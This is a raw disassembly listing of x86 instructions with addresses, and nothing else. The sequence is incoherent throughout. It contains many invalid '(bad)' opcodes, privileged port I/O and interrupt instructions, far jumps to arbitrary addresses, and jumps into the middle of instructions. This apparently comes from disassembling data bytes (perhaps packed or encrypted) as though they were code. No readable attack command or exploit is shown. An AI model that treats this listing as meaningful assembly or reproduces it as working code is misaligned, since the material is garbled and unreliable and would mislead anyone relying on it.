  40ecf5:	pop    edi
  40ecf6:	jl     0x40ed74
  40ecf8:	call   0x10c79b94
  40ecfd:	fs out dx,al
  40ecff:	lock pop eax
  40ed01:	mov    ecx,0x38b698d8
  40ed06:	inc    ecx
  40ed07:	das    
  40ed08:	mov    esi,0x56e18765
  40ed0d:	adc    eax,0x362910e
  40ed12:	inc    eax
  40ed13:	sbb    eax,0xd36aa9c8
  40ed18:	addr16 mov al,0x63
  40ed1b:	les    esp,FWORD PTR [edx-0x2a61c096]
  40ed21:	cmp    dl,BYTE PTR [esp+edx*1]
  40ed24:	rcl    ecx,0x7c
  40ed27:	or     edx,esi
  40ed29:	jecxz  0x40ed5b
  40ed2b:	push   0x3f116afe
  40ed30:	ror    DWORD PTR [esi+0x25e94c72],0xae
  40ed37:	xchg   ebx,eax
  40ed38:	xor    eax,DWORD PTR [ebp-0x1]
  40ed3b:	cdq    
  40ed3c:	imul   DWORD PTR [eax]
  40ed3e:	push   cs
  40ed3f:	xchg   esp,eax
  40ed40:	add    ebx,0xffffffe2
  40ed43:	jo     0x40ed72
  40ed45:	add    cl,BYTE PTR [edx+0x41d83a0f]
  40ed4b:	mov    cl,0xb7
  40ed4d:	push   edi
  40ed4e:	and    bh,dh
  40ed50:	inc    edi
  40ed51:	out    0x51,al
  40ed53:	mul    BYTE PTR [edx]
  40ed55:	mov    dl,0x8
  40ed57:	fwait
  40ed58:	xor    DWORD PTR [esi-0x24420ff3],0xffffff93
  40ed5f:	ret    0xf550
  40ed62:	jo     0x40ed4e
  40ed64:	cmc    
  40ed65:	aas    
  40ed66:	cmp    DWORD PTR [edx+0x17],esp
  40ed69:	ret    0xe717
  40ed6c:	(bad)  
  40ed6e:	jno    0x40ed6e
  40ed70:	jmp    0x7b95397a
  40ed75:	(bad)  
  40ed76:	xor    ecx,DWORD PTR [ebp+0x56]
  40ed79:	mov    ebp,0xb50ea257
  40ed7e:	dec    ecx
  40ed7f:	stos   DWORD PTR es:[edi],eax
  40ed80:	rcl    BYTE PTR [esi-0x6974dfaa],1
  40ed86:	adc    edx,DWORD PTR [esi+0x52ee3ba7]
  40ed8c:	pusha  
  40ed8d:	mov    al,0x61
  40ed8f:	pusha  
  40ed90:	ja     0x40eda8
  40ed92:	mov    ds:0xc5b64a83,al
  40ed97:	jns    0x40ed96
  40ed99:	fsubr  DWORD PTR [eax]
  40ed9b:	mov    fs,WORD PTR [ecx+0x36]
  40ed9e:	add    BYTE PTR [edx-0x33],dh
  40eda1:	sbb    ecx,DWORD PTR [eax+eiz*2-0x200ab63b]
  40eda8:	scas   eax,DWORD PTR es:[edi]
  40eda9:	inc    esi
  40edaa:	pop    eax
  40edab:	push   edi
  40edac:	push   edi
  40edad:	or     esi,DWORD PTR [esi+0x427b8a5f]
  40edb3:	idiv   BYTE PTR [ebp+0x51ce99b9]
  40edb9:	push   ss
  40edba:	push   eax
  40edbb:	mov    esi,0xe21a97c5
  40edc0:	pop    ecx
  40edc1:	out    0xe3,eax
  40edc3:	mov    ch,0xb
  40edc5:	adc    eax,0xaf8a693b
  40edca:	mov    ecx,0x5b272169
  40edcf:	mov    ah,0x4f
  40edd1:	icebp  
  40edd2:	adc    eax,eax
  40edd4:	nop
  40edd5:	mov    cl,BYTE PTR [edi+esi*4]
  40edd8:	mov    ebp,0x65dc4550
  40eddd:	push   edx
  40edde:	mov    cs,WORD PTR ds:0xec4484e2
  40ede4:	and    esi,esp
  40ede6:	inc    esp
  40ede7:	mov    dh,0x56
  40ede9:	cwde   
  40edea:	psubq  mm1,mm4
  40eded:	clc    
  40edee:	inc    esi
  40edef:	pop    esp
  40edf0:	inc    eax
  40edf1:	sub    ch,0x52
  40edf4:	inc    edx
  40edf5:	push   edi
  40edf6:	shl    BYTE PTR [edi+0x57],cl
  40edf9:	pusha  
  40edfa:	inc    edi
  40edfb:	sbb    DWORD PTR [ecx-0xb5b0cfe],ebx
  40ee01:	cs mov edx,0xa2effd8a
  40ee07:	inc    eax
  40ee08:	retf   0x2588
  40ee0b:	inc    edi
  40ee0c:	pushf  
  40ee0d:	mov    eax,ds:0x41bee9b
  40ee12:	shl    DWORD PTR [ecx-0x72],0x72
  40ee16:	xor    ah,cl
  40ee18:	add    eax,0x3322d8c3
  40ee1d:	inc    ebx
  40ee1e:	in     eax,0xff
  40ee20:	dec    ecx
  40ee21:	aad    0xd0
  40ee23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee24:	outs   dx,DWORD PTR ds:[esi]
  40ee25:	rcr    BYTE PTR [eax],cl
  40ee27:	aas    
  40ee28:	nop
  40ee29:	ret    0x5cce
  40ee2c:	leave  
  40ee2d:	aaa    
  40ee2e:	outs   dx,DWORD PTR ds:[esi]
  40ee2f:	xor    DWORD PTR [ebx-0x43416b67],ebx
  40ee35:	cmp    edx,edx
  40ee37:	out    dx,al
  40ee38:	sbb    eax,0x43de51e5
  40ee3d:	inc    esp
  40ee3e:	lahf   
  40ee3f:	addr16 fwait
  40ee41:	in     al,dx
  40ee42:	(bad)  
  40ee43:	mov    ah,0xc8
  40ee45:	xchg   esi,eax
  40ee46:	pop    ds
  40ee47:	jp     0x40ee80
  40ee49:	icebp  
  40ee4a:	add    eax,DWORD PTR [ebx]
  40ee4c:	das    
  40ee4d:	xor    eax,DWORD PTR [edx-0x3c032fd5]
  40ee53:	je     0x40ee14
  40ee55:	test   DWORD PTR [edx],ebx
  40ee57:	inc    ebx
  40ee58:	in     eax,dx
  40ee59:	cmc    
  40ee5a:	push   ebp
  40ee5b:	hlt    
  40ee5c:	outs   dx,DWORD PTR ds:[esi]
  40ee5e:	out    dx,al
  40ee5f:	sub    DWORD PTR [edi+0x799061e5],0x72
  40ee66:	jle    0x40ee4a
  40ee68:	or     bl,ch
  40ee6a:	out    0xeb,eax
  40ee6c:	inc    ebp
  40ee6d:	outs   dx,DWORD PTR ds:[esi]
  40ee6e:	add    ebx,DWORD PTR [ecx-0x24]
  40ee71:	in     eax,dx
  40ee72:	mul    DWORD PTR [edx]
  40ee74:	cli    
  40ee75:	cmp    DWORD PTR [edx*1-0x7b2a088f],edi
  40ee7c:	loopne 0x40ee77
  40ee7e:	pop    es
  40ee7f:	loop   0x40ee6b
  40ee81:	push   eax
  40ee82:	fdivr  QWORD PTR es:[edx-0x79ff0cc5]
  40ee89:	out    dx,eax
  40ee8a:	mov    edx,0x5eee6618
  40ee8f:	add    BYTE PTR [ebp+ebx*8+0xc20253],bh
  40ee96:	arpl   cx,bp
  40ee98:	stos   DWORD PTR es:[edi],eax
  40ee99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee9a:	cmp    ch,BYTE PTR [eax*8+0x315693b]
  40eea1:	mov    fs,ebx
  40eea3:	loop   0x40ee41
  40eea5:	fadd   DWORD PTR [edx-0x748027da]
  40eeab:	pop    ss
  40eeac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eead:	loop   0x40eecc
  40eeaf:	mov    BYTE PTR [edi],dh
  40eeb1:	pusha  
  40eeb2:	shr    bl,0x67
  40eeb5:	repz clc 
  40eeb7:	pop    ecx
  40eeb8:	or     bh,ch
  40eeba:	aas    
  40eebb:	sti    
  40eebc:	mov    DWORD PTR [ebx],eax
  40eebe:	loopne 0x40ee8a
  40eec0:	mov    cl,BYTE PTR [eax-0x3e]
  40eec3:	lar    edi,si
  40eec6:	add    ebx,DWORD PTR [ebx-0xa]
  40eec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eeca:	dec    eax
  40eecb:	or     al,0xfe
  40eecd:	sub    DWORD PTR [esi],0x8cbfe326
  40eed3:	push   esp
  40eed4:	push   edi
  40eed5:	jne    0x40eee8
  40eed7:	jns    0x40eec2
  40eed9:	ja     0x40ee6e
  40eedb:	scas   eax,DWORD PTR es:[edi]
  40eedc:	mov    ds:0xa79d1b6,ax
  40eee2:	aas    
  40eee3:	sbb    ebx,ecx
  40eee5:	mov    dl,0xf2
  40eee7:	nop
  40eee8:	(bad)  
  40eeeb:	jp     0x40eee6
  40eeed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeee:	cdq    
  40eeef:	mov    ch,0x9e
  40eef1:	cmc    
  40eef2:	or     ch,BYTE PTR [ebx-0x39]
  40eef5:	outs   dx,DWORD PTR ds:[esi]
  40eef6:	dec    edi
  40eef7:	xor    edx,DWORD PTR [esi+eax*2-0x7a2b7e93]
  40eefe:	(bad)  
  40eeff:	cmp    DWORD PTR [eax-0x48ae1c9e],edx
  40ef05:	cmp    al,0x67
  40ef07:	add    al,BYTE PTR [ebx-0x180b9fcb]
  40ef0d:	imul   eax,DWORD PTR [esi+0x52],0x5a
  40ef11:	or     BYTE PTR [ecx],al
  40ef13:	xor    DWORD PTR ds:0xfb155242,ebp
  40ef19:	(bad)  [esi+0x7c]
  40ef1c:	mov    DWORD PTR [esi+eiz*4],edi
  40ef1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef20:	mov    ecx,DWORD PTR [esp+edx*4]
  40ef23:	arpl   bx,bx
  40ef25:	mov    al,0xa6
  40ef27:	sahf   
  40ef28:	cwde   
  40ef29:	pusha  
  40ef2a:	push   0x741edf30
  40ef2f:	out    dx,al
  40ef30:	mov    cl,0xc3
  40ef32:	repnz std 
  40ef34:	lea    esi,[ecx]
  40ef36:	popa   
  40ef37:	xor    ebp,esi
  40ef39:	push   es
  40ef3a:	adc    eax,0x7a4ddfa6
  40ef3f:	jnp    0x697d8bc8
  40ef45:	push   0xb1887691
  40ef4a:	pop    ss
  40ef4b:	mov    dh,0x50
  40ef4d:	in     eax,dx
  40ef4e:	cmp    esp,eax
  40ef50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef51:	loop   0x40ef2c
  40ef53:	mov    eax,ds:0xa2812eef
  40ef58:	xor    BYTE PTR [ebp+0xd32ce95],dl
  40ef5e:	in     eax,dx
  40ef5f:	or     eax,0x8fe7078d
  40ef64:	push   esp
  40ef65:	cmp    eax,0xf50738ed
  40ef6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef6b:	mov    esi,0x740d06cb
  40ef70:	mov    esp,0xbc83b079
  40ef75:	mov    esi,0xeab6098f
  40ef7a:	fcmovnb st,st(5)
  40ef7c:	fdiv   st(1),st
  40ef7e:	inc    eax
  40ef7f:	push   edx
  40ef80:	xchg   edi,eax
  40ef81:	out    dx,al
  40ef82:	test   al,0x1c
  40ef84:	test   DWORD PTR [edx],0xcd2d050f
  40ef8a:	inc    esp
  40ef8b:	jecxz  0x40efe1
  40ef8d:	das    
  40ef8e:	ror    DWORD PTR [esi+0x5f],cl
  40ef91:	imul   ebx,ecx,0x1a
  40ef94:	add    BYTE PTR [eax],cl
  40ef96:	test   al,0x28
  40ef98:	fisttp DWORD PTR [eax+0x76337beb]
  40ef9e:	cwde   
  40ef9f:	dec    ebp
  40efa0:	jno    0x40ef39
  40efa2:	es push es
  40efa4:	xor    al,BYTE PTR [ebp+0x623167a1]
  40efaa:	in     al,dx
  40efab:	aaa    
  40efac:	xor    eax,0x31c774e3
  40efb1:	out    0x95,eax
  40efb3:	je     0x40ef69
  40efb5:	stos   BYTE PTR es:[edi],al
  40efb6:	mov    edx,0x5349d439
  40efbb:	daa    
  40efbc:	jmp    0x2c3:0x37f965df
  40efc3:	sub    al,0x58
  40efc5:	mov    ah,0xb1
  40efc7:	addr16 out dx,al
  40efc9:	pop    esi
  40efca:	mov    al,cl
  40efcc:	loopne 0x40efae
  40efce:	mov    esi,0x87b60816
  40efd3:	lea    esi,[esi+0x1818eba7]
  40efd9:	mov    edx,0x5786c87
  40efde:	mov    bh,0x8e
  40efe0:	and    ebx,0x9e5910f5
  40efe6:	xor    dl,dh
  40efe8:	imul   esi,DWORD PTR [edi-0x1b9626d],0x1f080bb2
  40eff2:	gs dec eax
  40eff4:	retf   
  40eff5:	daa    
  40eff6:	xor    al,0x98
  40eff8:	aam    0x3c
  40effa:	adc    esp,DWORD PTR [esi-0x2c]
  40effd:	pop    ebp
  40effe:	adc    BYTE PTR [esi],ch
  40f000:	das    
  40f001:	in     eax,0xc4
  40f003:	clc    
  40f004:	fwait
  40f005:	add    BYTE PTR [eax],ch
  40f007:	jns    0x40f03f
  40f009:	das    
  40f00a:	xchg   ecx,eax
  40f00b:	jmp    0x40f061
  40f00d:	mov    edx,0x3da4107f
  40f012:	xchg   ebp,eax
  40f013:	sub    dh,dh
  40f015:	or     dh,BYTE PTR [esi-0x55886baa]
  40f01b:	pop    esi
  40f01c:	popa   
  40f01d:	es and al,0xcf
  40f020:	sahf   
  40f021:	jb     0x40eff2
  40f023:	mov    WORD PTR [ecx+ebx*1-0x6b61bab0],ss
  40f02a:	xor    BYTE PTR [ebp-0x61],0x4f
  40f02e:	push   ds
  40f02f:	pop    es
  40f030:	sbb    al,BYTE PTR [edx]
  40f032:	iret   
  40f033:	push   esi
  40f034:	ins    BYTE PTR es:[edi],dx
  40f035:	inc    eax
  40f036:	call   0x79e410a4
  40f03b:	nop
  40f03c:	addr16 jge 0x40effd
  40f03f:	sub    eax,0x4efa223a
  40f044:	in     eax,dx
  40f045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f046:	cmp    ebp,DWORD PTR [edi+0x2ebf42fb]
  40f04c:	mov    DWORD PTR [esp+ebx*4],eax
  40f04f:	mov    esp,0x63588824
  40f054:	pop    ebx
  40f055:	je     0x40f0bb
  40f057:	mov    ds:0x8bc859b,eax
  40f05c:	sub    BYTE PTR [eax+0x3a],ah
  40f05f:	jmp    0x9014b74a
  40f064:	clc    
  40f065:	test   esi,0x418d435d
  40f06b:	in     al,dx
  40f06c:	out    dx,eax
  40f06d:	sbb    al,bl
  40f06f:	dec    edi
  40f070:	xchg   ebp,eax
  40f071:	into   
  40f072:	adc    eax,DWORD PTR [ecx+0x4772c5ce]
  40f078:	jns    0x40f095
  40f07a:	sbb    bl,BYTE PTR ds:[esi+0x4da91dd]
  40f081:	push   0xe683881b
  40f086:	(bad)  
  40f087:	and    ecx,esi
  40f089:	shl    ah,1
  40f08b:	and    ebp,DWORD PTR [ebx-0x50ff393]
  40f091:	lea    edi,[edx-0x62bfa1eb]
  40f097:	call   0x997:0x29d0b4af
  40f09e:	xchg   esi,eax
  40f09f:	bound  eax,QWORD PTR [ecx]
  40f0a1:	push   0x922eee92
  40f0a6:	imul   esi,edi,0xa
  40f0a9:	jmp    0x40f03a
  40f0ab:	xor    DWORD PTR [esi],esi
  40f0ad:	xchg   ecx,eax
  40f0ae:	and    BYTE PTR [ecx+0x73],bh
  40f0b1:	outs   dx,DWORD PTR ds:[esi]
  40f0b2:	or     bl,cl
  40f0b4:	les    ecx,FWORD PTR [esi-0x72]
  40f0b7:	jo     0x40f0b1
  40f0b9:	push   ebx
  40f0ba:	cmp    eax,0x25e2db6f
  40f0bf:	mov    BYTE PTR [edx-0x52],ch
  40f0c2:	jbe    0x40f10e
  40f0c4:	mov    ah,0x1c
  40f0c6:	sbb    dl,0x10
  40f0c9:	clc    
  40f0ca:	cmp    ebx,DWORD PTR [eax+0x7c2dc568]
  40f0d0:	or     ah,BYTE PTR [ebx+0x23]
  40f0d3:	(bad)  
  40f0d4:	mov    edi,0x567dbd7
  40f0d9:	xchg   ebx,eax
  40f0da:	cmp    bh,BYTE PTR [edi+0x6671ee35]
  40f0e0:	test   DWORD PTR [ebx+eax*2+0x46],eax
  40f0e4:	jmp    0x40f127
  40f0e6:	scas   eax,DWORD PTR es:[edi]
  40f0e7:	test   DWORD PTR [edi+ebp*4-0x6128587a],ebp
  40f0ee:	imul   edi,DWORD PTR ds:0xb51efe3f,0xffffffc2
  40f0f5:	xor    cl,bl
  40f0f7:	in     eax,0x10
  40f0f9:	push   edi
  40f0fa:	mov    bh,0xd2
  40f0fc:	and    al,0xb5
  40f0fe:	ins    BYTE PTR es:[edi],dx
  40f0ff:	push   ebp
  40f100:	adc    DWORD PTR [ebx+0x22da3fc5],ebx
  40f106:	inc    eax
  40f107:	inc    ebp
  40f108:	lea    ecx,[edi+0x1]
  40f10b:	retf   0xb368
  40f10e:	aad    0x66
  40f110:	and    BYTE PTR [eax-0x15],dl
  40f113:	mov    ebp,0xea7b124
  40f118:	xchg   ecx,eax
  40f119:	sbb    dh,dl
  40f11b:	shl    DWORD PTR [edx+eax*8],cl
  40f11e:	addr16 mov bl,0x88
  40f121:	mov    ebp,0x9f3b0a61
  40f126:	rol    BYTE PTR [ecx-0xc0505d],0x65
  40f12d:	loopne 0x40f0c7
  40f12f:	push   ecx
  40f130:	cmc    
  40f131:	jge    0x40f17d
  40f133:	sbb    cl,BYTE PTR ds:0x9ca540d3
  40f139:	mov    esi,0x59c0af19
  40f13e:	jmp    0x40f1b1
  40f140:	repnz in al,dx
  40f142:	xor    eax,0xc14a4d95
  40f147:	pop    eax
  40f148:	in     al,dx
  40f149:	dec    edi
  40f14a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f14b:	imul   eax,DWORD PTR [ebp+ebp*1+0x13a889cf],0x45b2fd0a
  40f156:	dec    ebp
  40f157:	jne    0x40f1bc
  40f159:	jae    0x40f13b
  40f15b:	pushf  
  40f15c:	adc    eax,0x2dc38f22
  40f161:	mov    edx,DWORD PTR [esi+eax*1]
  40f164:	push   edx
  40f165:	mov    al,0x49
  40f167:	mov    ah,0x3
  40f169:	jb     0x40f182
  40f16b:	int    0x26
  40f16d:	ror    DWORD PTR [edi+edx*4],0x53
  40f171:	mov    bh,0x84
  40f173:	mov    fs,edx
  40f175:	push   ss
  40f176:	pop    esp
  40f177:	test   eax,eax
  40f179:	ins    BYTE PTR es:[edi],dx
  40f17a:	lahf   
  40f17b:	ins    DWORD PTR es:[edi],dx
  40f17c:	mov    edi,0xb2d4813e
  40f181:	mov    ebx,0xdfa07c51
  40f186:	jmp    0x40f13e
  40f188:	xchg   edx,eax
  40f189:	push   edi
  40f18a:	jecxz  0x40f1df
  40f18c:	scas   eax,DWORD PTR es:[edi]
  40f18d:	dec    ebp
  40f18e:	(bad)  
  40f190:	mov    eax,0x301fff96
  40f196:	add    BYTE PTR [esi],cl
  40f198:	mov    ds:0xd8dd8431,eax
  40f19d:	mov    ch,0xe8
  40f19f:	fucomip st,st(4)
  40f1a1:	and    BYTE PTR [edx+eax*2-0x3],al
  40f1a5:	leave  
  40f1a6:	xor    eax,0x94db7931
  40f1ab:	rcr    bh,1
  40f1ad:	inc    ebp
  40f1ae:	and    al,0xe1
  40f1b0:	mov    dh,0xa
  40f1b2:	aam    0x46
  40f1b4:	mov    esi,0x29ba5990
  40f1b9:	xchg   esp,eax
  40f1ba:	adc    DWORD PTR [ebx+edx*8],esp
  40f1bd:	enter  0xfc59,0xcc
  40f1c1:	cmp    bh,BYTE PTR [ecx]
  40f1c3:	push   esp
  40f1c4:	repnz sbb bl,0x60
  40f1c8:	outs   dx,BYTE PTR ds:[esi]
  40f1c9:	xor    eax,0xa15cfdfa
  40f1ce:	(bad)  
  40f1cf:	adc    eax,0x43d14b66
  40f1d4:	in     eax,dx
  40f1d5:	call   0xf28d56ca
  40f1da:	je     0x40f226
  40f1dc:	pop    ax
  40f1de:	sbb    esi,ecx
  40f1e0:	xlat   BYTE PTR ds:[ebx]
  40f1e1:	data16 int 0x1a
  40f1e4:	js     0x40f1e8
  40f1e6:	xor    eax,0x36e6bfd3
  40f1eb:	mov    ds:0x5a1f69d4,eax
  40f1f0:	xchg   edx,eax
  40f1f1:	xchg   ebx,eax
  40f1f2:	shl    cl,1
  40f1f4:	test   dl,bl
  40f1f6:	sti    
  40f1f7:	dec    esi
  40f1f8:	lods   eax,DWORD PTR ds:[esi]
  40f1f9:	sahf   
  40f1fa:	(bad)  
  40f1fc:	test   BYTE PTR [ecx+0x33ff80f0],al
  40f202:	sub    ebx,esi
  40f204:	retf   
  40f205:	fistp  DWORD PTR [ebp-0xf]
  40f209:	ins    DWORD PTR es:[edi],dx
  40f20a:	xchg   bl,ch
  40f20c:	aaa    
  40f20d:	out    dx,al
  40f20e:	jg     0x40f1bd
  40f210:	push   es
  40f211:	fdivr  DWORD PTR [edx]
  40f213:	fisub  DWORD PTR [eax]
  40f215:	inc    esi
  40f216:	pop    edx
  40f217:	adc    al,BYTE PTR [ecx]
  40f219:	sub    dh,bl
  40f21b:	xchg   edx,eax
  40f21c:	xchg   DWORD PTR [ecx],eax
  40f21e:	arpl   sp,sp
  40f220:	(bad)  
  40f221:	in     eax,0xc3
  40f223:	pop    ds
  40f224:	mov    ah,BYTE PTR [esi+ebp*4+0x56a72ad0]
  40f22b:	cmc    
  40f22c:	pop    es
  40f22d:	into   
  40f22e:	lds    ebp,FWORD PTR [ecx+0x5b296bd6]
  40f234:	leave  
  40f235:	sahf   
  40f236:	add    al,0x9a
  40f238:	in     al,0xd3
  40f23a:	pop    esi
  40f23b:	xchg   ebp,ebp
  40f23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f23e:	shl    edx,0xb9
  40f241:	pop    esp
  40f242:	outs   dx,BYTE PTR ds:[esi]
  40f243:	pop    ecx
  40f244:	push   ecx
  40f245:	in     al,dx
  40f246:	in     al,0x21
  40f248:	clc    
  40f249:	jae    0x40f232
  40f24b:	fisttp DWORD PTR [esp+eiz*4]
  40f24e:	or     DWORD PTR [ebx-0x1a],0xffffff96
  40f252:	loopne 0x40f297
  40f254:	and    DWORD PTR [ebx-0x79],ecx
  40f257:	stos   BYTE PTR es:[edi],al
  40f258:	rcr    esp,1
  40f25a:	jle    0x5323897e
  40f260:	(bad)  
  40f261:	mov    esi,0x2832a8b1
  40f266:	jp     0x40f263
  40f268:	(bad)
  40f26c:	inc    ebx
  40f26d:	aaa    
  40f26e:	cmp    DWORD PTR [ebp-0x41],ebx
  40f271:	pop    ecx
  40f272:	lods   al,BYTE PTR ds:[esi]
  40f273:	cmp    ebx,DWORD PTR [edi]
  40f275:	les    edi,FWORD PTR [ebx-0x48beed68]
  40f27b:	ds pop ds
  40f27d:	neg    BYTE PTR [ecx-0x1a4c629c]
  40f283:	xchg   edx,eax
  40f284:	in     eax,dx
  40f285:	enter  0x4560,0xbc
  40f289:	cld    
  40f28a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f28b:	mov    bl,0x3f
  40f28d:	out    dx,al
  40f28e:	add    al,0x1a
  40f290:	push   esi
  40f291:	test   eax,0x2dd8c8c0
  40f296:	or     BYTE PTR [ebx],0xeb
  40f299:	pop    ecx
  40f29a:	xchg   edx,eax
  40f29b:	enter  0x4339,0x5f
  40f29f:	div    DWORD PTR [ebp-0x1e]
  40f2a2:	pop    eax
  40f2a3:	jecxz  0x40f2f2
  40f2a5:	inc    edx
  40f2a6:	loop   0x40f322
  40f2a8:	inc    ebx
  40f2a9:	inc    ebp
  40f2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2ab:	retf   0xa027
  40f2ae:	push   ebx
  40f2af:	retf   
  40f2b0:	out    dx,eax
  40f2b1:	or     BYTE PTR [ecx+edx*4+0x1d7713d0],cl
  40f2b8:	xchg   esi,eax
  40f2b9:	add    al,0x72
  40f2bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2bc:	sbb    bh,bl
  40f2be:	in     eax,0x6e
  40f2c0:	pop    eax
  40f2c1:	add    ecx,DWORD PTR [eax-0x6f]
  40f2c4:	jge    0x40f2cd
  40f2c6:	ds test eax,0x22685480
  40f2cc:	xor    BYTE PTR [ebx],0xac
  40f2cf:	ins    BYTE PTR es:[edi],dx
  40f2d0:	xor    eax,DWORD PTR es:[ebx-0x2e96030d]
  40f2d7:	in     eax,0xe6
  40f2d9:	mov    esp,0x4144ecbd
  40f2de:	aam    0xc4
  40f2e0:	push   edi
  40f2e1:	mov    eax,ds:0xc9aa6952
  40f2e6:	push   ebp
  40f2e7:	in     eax,0xa9
  40f2e9:	mov    ds:0x1411dfdd,al
  40f2ee:	push   esp
  40f2ef:	jbe    0x40f35b
  40f2f1:	pop    ecx
  40f2f2:	push   0xbe5ef473
  40f2f7:	mov    edi,0x91378c12
  40f2fc:	sub    BYTE PTR [edi+eax*2+0x344c0641],bl
  40f303:	xor    al,0xc1
  40f305:	mov    WORD PTR [eax],fs
  40f307:	lea    edx,[eax+0xd01b0b5]
  40f30d:	retf   
  40f30e:	and    bh,BYTE PTR [edi-0xe56a4f8]
  40f314:	push   edx
  40f315:	xor    DWORD PTR [esi-0x63],esp
  40f318:	sub    DWORD PTR [ebx+0x49],0x64
  40f31c:	retf   0x3f8e
  40f31f:	jmp    0x7a7a6e3c
  40f324:	xor    al,0xb4
  40f326:	call   0xaacf:0x695f1d47
  40f32d:	inc    ebx
  40f32e:	sub    al,BYTE PTR [esi]
  40f330:	fcmovbe st,st(7)
  40f332:	clc    
  40f333:	scas   eax,DWORD PTR es:[edi]
  40f334:	xor    bl,BYTE PTR [edi+eiz*4]
  40f337:	out    0xc3,al
  40f339:	xor    ah,ch
  40f33b:	(bad)
  40f33f:	fdiv   QWORD PTR [ebx+0x2c]
  40f342:	mov    WORD PTR [eax],cs
  40f344:	pop    ds
  40f345:	shr    BYTE PTR [ebx-0x1fea7cac],0xc8
  40f34c:	cmp    eax,0x11204334
  40f351:	sahf   
  40f352:	dec    ebx
  40f353:	and    BYTE PTR [edi+0x163349b9],0xce
  40f35a:	push   0x4f737759
  40f35f:	cld    
  40f360:	pop    ds
  40f361:	call   0xa869:0x42146676
  40f368:	retf   
  40f369:	fidivr WORD PTR [esi]
  40f36b:	sub    dh,BYTE PTR [esi+0x31]
  40f36e:	cmp    eax,0xa676c854
  40f373:	mov    eax,0xaf0c476a
  40f378:	imul   edx,DWORD PTR [ecx],0xe1c810ba
  40f37e:	push   esi
  40f37f:	inc    ecx
  40f380:	test   BYTE PTR [esi],dl
  40f382:	and    bh,BYTE PTR [esi+ebp*2-0x4f454f1d]
  40f389:	add    dl,BYTE PTR [edi]
  40f38b:	jne    0x40f328
  40f38d:	vmovlps xmm4,xmm6,QWORD PTR [ecx+0x2a]
  40f392:	lods   al,BYTE PTR ds:[esi]
  40f393:	fwait
  40f394:	pop    esp
  40f395:	dec    ebp
  40f396:	leave  
  40f397:	mov    esp,0x8b7eb733
  40f39c:	jl     0x40f39b
  40f39e:	adc    al,0x9f
  40f3a0:	mov    ch,0xaa
  40f3a2:	inc    esp
  40f3a3:	xchg   esp,eax
  40f3a4:	ins    DWORD PTR es:[edi],dx
  40f3a5:	sbb    eax,0x20dccbf3
  40f3aa:	arpl   WORD PTR [edi],dx
  40f3ac:	inc    esi
  40f3ad:	mov    bh,0x9a
  40f3af:	lods   al,BYTE PTR ds:[esi]
  40f3b0:	inc    edi
  40f3b1:	and    DWORD PTR [eax+0x1ead3066],eax
  40f3b7:	jne    0x40f403
  40f3b9:	test   ch,cl
  40f3bb:	xor    edx,DWORD PTR [edi+edx*1+0x75]
  40f3bf:	sub    dl,BYTE PTR [edx+0x5a320697]
  40f3c5:	addr16 cmp eax,0xe121b52c
  40f3cb:	and    al,0x82
  40f3cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3ce:	(bad)  [edi+0x56e261c3]
  40f3d4:	mov    edx,0x5388ad16
  40f3d9:	mov    BYTE PTR [edx+0x5165c6a3],bl
  40f3df:	inc    ebx
  40f3e0:	xchg   BYTE PTR [edx+0x2a],dl
  40f3e3:	cmp    ecx,DWORD PTR [eax+0x2f]
  40f3e6:	inc    edi
  40f3e7:	xchg   edx,eax
  40f3e8:	sbb    al,0x29
  40f3ea:	(bad)  
  40f3eb:	sub    dh,BYTE PTR [ecx]
  40f3ed:	mov    cl,0xf7
  40f3ef:	outs   dx,DWORD PTR ds:[esi]
  40f3f0:	mov    edx,0xdf0c69ee
  40f3f5:	repnz repnz push edx
  40f3f8:	mov    cl,0xb3
  40f3fa:	clc    
  40f3fb:	dec    edi
  40f3fc:	add    edi,0xc4850af3
  40f402:	add    BYTE PTR [ebx+0xd543fa9],ch
  40f408:	push   0x1d54ce4e
  40f40d:	lods   al,BYTE PTR ds:[esi]
  40f40e:	pmaddwd mm2,QWORD PTR [ecx+0x27]
  40f412:	push   ecx
  40f413:	jbe    0x40f428
  40f415:	inc    ebp
  40f416:	daa    
  40f417:	cmp    edx,DWORD PTR [edi+0x42]
  40f41a:	jecxz  0x40f434
  40f41c:	retf   0xafd2
  40f41f:	xchg   esp,eax
  40f420:	scas   al,BYTE PTR es:[edi]
  40f421:	ins    DWORD PTR es:[edi],dx
  40f422:	in     al,dx
  40f423:	jbe    0x40f48a
  40f425:	cdq    
  40f426:	fisttp QWORD PTR [ecx]
  40f428:	or     dh,BYTE PTR [esi+0x4a]
  40f42b:	cdq    
  40f42c:	dec    ecx
  40f42d:	mov    al,ds:0x8679e55c
  40f432:	out    0xb6,eax
  40f434:	mov    cl,0x48
  40f436:	in     al,0xef
  40f438:	push   cs
  40f439:	test   DWORD PTR [edx+0x1fcd0c60],edi
  40f43f:	mov    ch,0xaa
  40f441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f442:	loopne 0x40f47c
  40f444:	xchg   DWORD PTR [ebp+0x58],edx
  40f447:	jmp    0x40f4a7
  40f449:	add    DWORD PTR [ecx-0x4a],esi
  40f44c:	dec    ebx
  40f44d:	mov    ch,0x5f
  40f44f:	(bad)  
  40f450:	mov    dl,0x9d
  40f452:	and    al,0xc6
  40f454:	push   ecx
  40f455:	sub    DWORD PTR [esi],0x63beccc9
  40f45b:	loopne 0x40f477
  40f45d:	lock sbb ecx,esp
  40f460:	in     al,0x77
  40f462:	jne    0x40f459
  40f464:	loope  0x40f458
